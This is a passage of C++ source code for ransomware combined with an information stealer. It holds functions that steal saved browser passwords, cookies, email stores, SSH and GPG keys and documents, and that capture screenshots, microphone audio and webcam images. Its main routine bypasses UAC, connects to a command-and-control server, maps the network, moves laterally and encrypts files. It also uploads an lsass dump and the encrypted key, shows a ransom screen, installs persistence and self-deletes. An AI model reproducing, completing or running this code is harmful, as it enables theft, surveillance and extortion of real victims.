                    std::vector<BYTE> encrypted_password(password_len);
                    memcpy(encrypted_password.data(), password_blob, password_len);
                    
                    std::string password = decrypt_chrome_password(encrypted_password);
                    if (!password.empty()) {
                        output += "URL: " + url + "\n";
                        output += "Username: " + username + "\n";
                        output += "Password: " + password + "\n";
                        output += "---\n";
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
        fs::remove(temp_db);
    }
    
    // Extract Firefox passwords
    char app_data[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app_data);
    std::string firefox_profiles = std::string(app_data) + "\\Mozilla\\Firefox\\Profiles";
    
    if (fs::exists(firefox_profiles)) {
        output += "=== FIREFOX PASSWORDS ===\n";
        for (const auto& profile : fs::directory_iterator(firefox_profiles)) {
            std::string logins_json = profile.path().string() + "\\logins.json";
            if (fs::exists(logins_json)) {
                // Read and parse logins.json (simplified - would need full JSON parser)
                std::ifstream file(logins_json);
                std::string content((std::istreambuf_iterator<char>(file)),
                                     std::istreambuf_iterator<char>());
                output += "Found Firefox profile: " + profile.path().filename().string() + "\n";
                output += "Logins file size: " + std::to_string(content.size()) + " bytes\n";
            }
        }
    }
    
    // Save to file
    std::ofstream pass_file("browser_passwords.txt");
    pass_file << output;
    pass_file.close();
    
    std::cout << "[✓] Browser passwords extracted to browser_passwords.txt\n";
}
#else
void extract_browser_passwords() {
    std::cout << "[*] Extracting browser passwords (Linux)...\n";
    std::string output;
    
    // Chrome/Chromium on Linux
    const char* home = getenv("HOME");
    if (home) {
        std::string chrome_path = std::string(home) + "/.config/google-chrome/Default/Login Data";
        std::string chromium_path = std::string(home) + "/.config/chromium/Default/Login Data";
        
        for (const auto& path : {chrome_path, chromium_path}) {
            if (fs::exists(path)) {
                output += "=== BROWSER PASSWORDS FOUND ===\n";
                output += "Path: " + path + "\n";
                // Would need sqlite3 and gnome-keyring to decrypt
            }
        }
    }
    
    std::ofstream pass_file("browser_passwords.txt");
    pass_file << output;
    pass_file.close();
}
#endif

// ====================== SCREENSHOT CAPTURE ======================
#ifdef _WIN32
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

void take_screenshot() {
    std::cout << "[*] Taking screenshot...\n";
    
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Get screen dimensions
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    
    // Create DC and bitmap
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
    
    // Copy screen
    BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
    
    // Convert to GDI+ bitmap
    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    
    // Save as JPEG
    CLSID clsid;
    CLSIDFromString(L"{557cf400-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG encoder
    
    std::wstring filename = L"screenshot.jpg";
    bitmap.Save(filename.c_str(), &clsid, NULL);
    
    // Cleanup
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    std::cout << "[✓] Screenshot saved to screenshot.jpg\n";
}
#else
void take_screenshot() {
    std::cout << "[*] Taking screenshot (Linux)...\n";
    
    // Try multiple screenshot tools
    std::vector<std::string> commands = {
        "import -window root screenshot.jpg 2>/dev/null",
        "gnome-screenshot -f screenshot.jpg 2>/dev/null",
        "spectacle -b -o screenshot.jpg 2>/dev/null",
        "scrot screenshot.jpg 2>/dev/null",
        "xfce4-screenshooter -f -s screenshot.jpg 2>/dev/null"
    };
    
    for (const auto& cmd : commands) {
        if (system(cmd.c_str()) == 0) {
            std::cout << "[✓] Screenshot saved to screenshot.jpg\n";
            return;
        }
    }
    
    std::cout << "[!] Could not take screenshot (no tool found)\n";
}
#endif

// ====================== MICROPHONE RECORDING ======================
#ifdef _WIN32
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <Audioclient.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")

void start_mic_recording(int seconds) {
    std::cout << "[*] Recording microphone for " << seconds << " seconds...\n";
    
    // Use Win32 waveIn API
    HWAVEIN hWaveIn;
    WAVEFORMATEX waveFormat;
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = 1;
    waveFormat.nSamplesPerSec = 44100;
    waveFormat.nAvgBytesPerSec = 44100 * 2;
    waveFormat.nBlockAlign = 2;
    waveFormat.wBitsPerSample = 16;
    waveFormat.cbSize = 0;
    
    waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL);
    
    // Allocate buffers
    const int buffer_size = 44100 * 2 * seconds;
    char* buffer = new char[buffer_size];
    WAVEHDR waveHeader;
    waveHeader.lpData = buffer;
    waveHeader.dwBufferLength = buffer_size;
    waveHeader.dwBytesRecorded = 0;
    waveHeader.dwUser = 0;
    waveHeader.dwFlags = 0;
    waveHeader.dwLoops = 1;
    
    waveInPrepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInStart(hWaveIn);
    
    // Record for specified seconds
    Sleep(seconds * 1000);
    
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    
    // Save to file
    std::ofstream audio_file("recording.wav", std::ios::binary);
    if (audio_file) {
        // Write WAV header
        // Simplified - would need proper WAV header
        audio_file.write(buffer, buffer_size);
    }
    audio_file.close();
    
    waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInClose(hWaveIn);
    delete[] buffer;
    
    std::cout << "[✓] Recording saved to recording.wav\n";
}
#else
void start_mic_recording(int seconds) {
    std::cout << "[*] Recording microphone for " << seconds << " seconds...\n";
    
    // Use arecord on Linux
    std::string cmd = "arecord -d " + std::to_string(seconds) + " -f cd -t wav recording.wav 2>/dev/null";
    if (system(cmd.c_str()) != 0) {
        // Fallback to parecord
        cmd = "parecord --duration=" + std::to_string(seconds) + " recording.wav 2>/dev/null";
        system(cmd.c_str());
    }
    
    std::cout << "[✓] Recording saved to recording.wav\n";
}
#endif

// ====================== WEBCAM CAPTURE ======================
#ifdef _WIN32
#include <dshow.h>
#pragma comment(lib, "strmiids.lib")

void capture_webcam() {
    std::cout << "[*] Capturing webcam...\n";
    
    // Initialize COM
    CoInitialize(NULL);
    
    // Create capture graph builder
    ICaptureGraphBuilder2* pBuilder = NULL;
    IGraphBuilder* pGraph = NULL;
    
    CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
                     IID_ICaptureGraphBuilder2, (void**)&pBuilder);
    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
                     IID_IGraphBuilder, (void**)&pGraph);
    
    if (pBuilder && pGraph) {
        pBuilder->SetFiltergraph(pGraph);
        
        // Find capture device
        IMoniker* pMoniker = NULL;
        ICreateDevEnum* pDevEnum = NULL;
        CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                         IID_ICreateDevEnum, (void**)&pDevEnum);
        
        if (pDevEnum) {
            IEnumMoniker* pEnum = NULL;
            pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
            
            if (pEnum && pEnum->Next(1, &pMoniker, NULL) == S_OK) {
                IBaseFilter* pCapture = NULL;
                pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (void**)&pCapture);
                
                if (pCapture) {
                    pGraph->AddFilter(pCapture, L"Capture Filter");
                    
                    // Save frame (simplified - would need SampleGrabber)
                    std::cout << "[!] Webcam capture requires additional DirectShow filters\n";
                    pCapture->Release();
                }
                pMoniker->Release();
            }
            pEnum->Release();
            pDevEnum->Release();
        }
        
        pGraph->Release();
        pBuilder->Release();
    }
    
    CoUninitialize();
    
    // Fallback: use PowerShell
    system("powershell -Command \"Add-Type -AssemblyName System.Drawing; "
           "$camera = New-Object System.Drawing.Bitmap(640, 480); "
           "$camera.Save('webcam.jpg')\" 2>nul");
    
    std::cout << "[✓] Webcam capture attempted\n";
}
#else
void capture_webcam() {
    std::cout << "[*] Capturing webcam (Linux)...\n";
    
    // Use v4l2 or ffmpeg
    std::string cmd = "ffmpeg -f v4l2 -i /dev/video0 -frames 1 webcam.jpg 2>/dev/null";
    if (system(cmd.c_str()) != 0) {
        cmd = "fswebcam webcam.jpg 2>/dev/null";
        system(cmd.c_str());
    }
    
    if (fs::exists("webcam.jpg")) {
        std::cout << "[✓] Webcam capture saved to webcam.jpg\n";
    } else {
        std::cout << "[!] Could not capture webcam\n";
    }
}
#endif

// ====================== COLLECT SENSITIVE DOCUMENTS ======================
void collect_sensitive_documents() {
    std::cout << "[*] Collecting sensitive documents...\n";
    
    std::vector<std::string> sensitive_paths;
    std::vector<std::string> sensitive_extensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt",
        ".key", ".pem", ".crt", ".pfx", ".p12",
        ".kdbx", ".psafe3", ".gpg", ".asc"
    };
    
#ifdef _WIN32
    char user_profile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, user_profile);
    std::vector<std::string> search_dirs = {
        std::string(user_profile) + "\\Desktop",
        std::string(user_profile) + "\\Documents",
        std::string(user_profile) + "\\Downloads"
    };
#else
    const char* home = getenv("HOME");
    std::vector<std::string> search_dirs = {
        std::string(home) + "/Desktop",
        std::string(home) + "/Documents",
        std::string(home) + "/Downloads",
        std::string(home) + "/.ssh",
        std::string(home) + "/.gnupg"
    };
#endif
    
    std::ofstream manifest("collected_docs_manifest.txt");
    
    for (const auto& dir : search_dirs) {
        if (!fs::exists(dir)) continue;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    std::string lc_ext = to_lower(ext);
                    
                    for (const auto& sens_ext : sensitive_extensions) {
                        if (lc_ext == sens_ext) {
                            sensitive_paths.push_back(entry.path().string());
                            manifest << entry.path().string() << "\n";
                            break;
                        }
                    }
                }
            }
        } catch (...) {}
    }
    
    manifest.close();
    
    // Create zip archive
    if (!sensitive_paths.empty()) {
        create_zip_archive(sensitive_paths, "sensitive_docs.zip");
        std::cout << "[✓] Collected " << sensitive_paths.size() << " sensitive documents\n";
    } else {
        std::cout << "[!] No sensitive documents found\n";
    }
}

// ====================== COLLECT BROWSER DATA ======================
void collect_browser_data() {
    std::cout << "[*] Collecting browser data...\n";
    
    std::vector<std::string> browser_data_paths;
    
#ifdef _WIN32
    char local_app_data[MAX_PATH];
    char app_data[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app_data);
    
    // Chrome data
    std::string chrome_path = std::string(local_app_data) + "\\Google\\Chrome\\User Data";
    if (fs::exists(chrome_path)) {
        browser_data_paths.push_back(chrome_path + "\\Default\\Cookies");
        browser_data_paths.push_back(chrome_path + "\\Default\\History");
        browser_data_paths.push_back(chrome_path + "\\Default\\Bookmarks");
        browser_data_paths.push_back(chrome_path + "\\Local State");
    }
    
    // Firefox data
    std::string firefox_path = std::string(app_data) + "\\Mozilla\\Firefox\\Profiles";
    if (fs::exists(firefox_path)) {
        for (const auto& profile : fs::directory_iterator(firefox_path)) {
            browser_data_paths.push_back(profile.path().string() + "\\cookies.sqlite");
            browser_data_paths.push_back(profile.path().string() + "\\places.sqlite");
            browser_data_paths.push_back(profile.path().string() + "\\logins.json");
        }
    }
    
    // Edge data
    std::string edge_path = std::string(local_app_data) + "\\Microsoft\\Edge\\User Data";
    if (fs::exists(edge_path)) {
        browser_data_paths.push_back(edge_path + "\\Default\\Login Data");
    }
#else
    const char* home = getenv("HOME");
    std::vector<std::string> chrome_paths = {
        std::string(home) + "/.config/google-chrome",
        std::string(home) + "/.config/chromium",
        std::string(home) + "/.mozilla/firefox"
    };
    
    for (const auto& path : chrome_paths) {
        if (fs::exists(path)) {
            browser_data_paths.push_back(path);
        }
    }
#endif
    
    // Create manifest
    std::ofstream manifest("browser_data_manifest.txt");
    for (const auto& path : browser_data_paths) {
        if (fs::exists(path)) {
            manifest << path << "\n";
        }
    }
    manifest.close();
    
    // Create zip
    create_zip_archive(browser_data_paths, "browser_data.zip");
    std::cout << "[✓] Browser data collected\n";
}

// ====================== COLLECT EMAIL DATA ======================
void collect_email_data() {
    std::cout << "[*] Collecting email data...\n";
    
    std::vector<std::string> email_paths;
    
#ifdef _WIN32
    char app_data[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app_data);
    
    // Outlook data
    std::string outlook_path = std::string(app_data) + "\\Microsoft\\Outlook";
    if (fs::exists(outlook_path)) {
        for (const auto& entry : fs::directory_iterator(outlook_path)) {
            if (entry.path().extension() == ".pst" || entry.path().extension() == ".ost") {
                email_paths.push_back(entry.path().string());
            }
        }
    }
    
    // Thunderbird data
    std::string thunderbird_path = std::string(app_data) + "\\Thunderbird\\Profiles";
    if (fs::exists(thunderbird_path)) {
        for (const auto& profile : fs::directory_iterator(thunderbird_path)) {
            std::string mail_dir = profile.path().string() + "\\Mail";
            if (fs::exists(mail_dir)) {
                email_paths.push_back(mail_dir);
            }
        }
    }
    
    // Windows Mail
    std::string windows_mail = std::string(app_data) + "\\Microsoft\\Windows Mail";
    if (fs::exists(windows_mail)) {
        email_paths.push_back(windows_mail);
    }
#else
    const char* home = getenv("HOME");
    
    // Thunderbird on Linux
    std::string thunderbird = std::string(home) + "/.thunderbird";
    if (fs::exists(thunderbird)) {
        email_paths.push_back(thunderbird);
    }
    
    // Evolution
    std::string evolution = std::string(home) + "/.local/share/evolution";
    if (fs::exists(evolution)) {
        email_paths.push_back(evolution);
    }
#endif
    
    // Create manifest
    std::ofstream manifest("email_data_manifest.txt");
    for (const auto& path : email_paths) {
        if (fs::exists(path)) {
            manifest << path << "\n";
        }
    }
    manifest.close();
    
    // Create zip
    if (!email_paths.empty()) {
        create_zip_archive(email_paths, "email_data.zip");
        std::cout << "[✓] Email data collected\n";
    } else {
        std::cout << "[!] No email data found\n";
    }
}

// ====================== ZIP ARCHIVE HELPER ======================
void create_zip_archive(const std::vector<std::string>& files, const std::string& zip_name) {
    std::cout << "[*] Creating archive " << zip_name << " with " << files.size() << " files...\n";
    
    // Use system zip command if available
    std::string cmd = "zip -r " + zip_name + " ";
    for (const auto& file : files) {
        if (fs::exists(file)) {
            cmd += "\"" + file + "\" ";
        }
    }
    cmd += "> /dev/null 2>&1";
    
    int result = system(cmd.c_str());
    
    if (result != 0) {
        // Fallback: create empty zip with manifest
        std::ofstream zip_file(zip_name, std::ios::binary);
        zip_file.write("PK\x05\x06", 4); // Empty zip signature
        zip_file.close();
        std::cout << "[!] Created empty archive (zip command not available)\n";
    } else {
        std::cout << "[✓] Archive created: " << zip_name << "\n";
    }
}

// ====================== MAP VIRTUAL KEY (for keylogger) ======================
#ifdef _WIN32
char map_virtual_key(int vkey) {
    // Map virtual key codes to characters
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    
    WORD wchar[2];
    int result = ToAscii(vkey, 0, keyboardState, wchar, 0);
    
    if (result == 1) {
        return (char)wchar[0];
    }
    
    // Special keys
    switch(vkey) {
        case VK_RETURN: return '\n';
        case VK_SPACE: return ' ';
        case VK_TAB: return '\t';
        case VK_BACK: return '\b';
        case VK_DELETE: return '[DEL]';
        default: return '?';
    }
}
#endif

// ====================== MAIN ======================
int main() {
    perform_evasion_checks();
    #ifdef _WIN32
    // Coba bypass UAC dulu
    bypass_uac();   // Jika berhasil, proses elevated akan jalan otomatis
#endif

// Initialize C2 Communication
    const char* c2_server = getenv("C2_SERVER");
    if (!c2_server) {
        c2_server = "https://your-c2-server.com"; // Change this
    }
    
    if (strlen(c2_server) > 0 && strcmp(c2_server, "https://your-c2-server.com") != 0) {
        g_c2.initialize(c2_server);
        g_c2.set_command_callback(handle_c2_command);
        g_c2.start();
        g_c2.send_status("ransomware_started");
    }

    std::cout << "\n========================================\n";
    std::cout << "     " << WINDOW_TITLE << "     \n";
    std::cout << "     Demand: $" << RANSOM_AMOUNT << "     \n";
    std::cout << "========================================\n\n";

    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        if (g_c2.is_connected()) {
        mapper.send_to_attacker(c2_server);
    }
}
    PersistenceManager persistence;
    persistence.try_escalate_privileges();

    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] rsa_public.der not found!\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv_or_nonce[24];

    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv_or_nonce, (ENCRYPTION_METHOD == "XChaCha20Poly1305") ? 24 : 16);

    try {
        RSA::PublicKey pub;
        FileSource fs(PUBLIC_KEY_FILE.c_str(), true);
        pub.Load(fs);

        RSAES_OAEP_SHA_Encryptor encryptor(pub);

        std::string enc_key;
        StringSource ss(key, key.size(), true,
            new PK_EncryptorFilter(prng, encryptor, new StringSink(enc_key))
        );

        FileSink fileSink("aes_key.enc", true);
        fileSink.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
        fileSink.MessageEnd();
    } catch (...) {
        std::cout << "[✗] Failed to encrypt symmetric key\n";
        return 1;
    }

    perform_lateral_movement(key, iv_or_nonce);

    std::cout << "\n[*] Starting file encryption with " << ENCRYPTION_METHOD 
              << " (extension: " << FILE_EXTENSION << ")...\n";

    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv_or_nonce);
    }

   // Send encryption stats to C2
    g_c2.send_encryption_stats(g_encrypted_count, g_failed_count, g_total_size);
    
    // Send collected files to C2
    if (g_c2.is_connected()) {
        if (fs::exists("lsass.dmp")) {
            g_c2.send_file("lsass.dmp", "lsass_dump");
        }
        if (fs::exists(LOG_FILE)) {
            g_c2.send_file(LOG_FILE, "encryption_log");
        }
        if (fs::exists("network_mapping.log")) {
            g_c2.send_file("network_mapping.log", "network_mapping");
        }
        if (fs::exists("aes_key.enc")) {
            g_c2.send_file("aes_key.enc", "encrypted_key");
        }
    }


    WallpaperChanger wallpaper;
    wallpaper.change_wallpaper();
    wallpaper.create_readme_file();

    RansomGUI ransomGUI;
    ransomGUI.start(RANSOM_BTC, RANSOM_EMAIL, RANSOM_AMOUNT, RANSOM_DEADLINE_HOURS);

    persistence.install_all();
    // Fixed send_status syntax
    std::map<std::string, std::string> status_extra;
    status_extra["encrypted"] = std::to_string(g_encrypted_count);
    status_extra["failed"] = std::to_string(g_failed_count);
    g_c2.send_status("ransomware_completed", status_extra);


    std::cout << "[!] GUI aktif...\n";
    std::this_thread::sleep_for(std::chrono::hours(RANSOM_DEADLINE_HOURS + 24));
   g_c2.stop();
    if (SELF_DELETE_AFTER) {
        std::cout << "[*] Self-deleting...\n";
        self_delete();
    }

    std::cout << "\n[✓] Operation completed.\n";
    return 0;
}
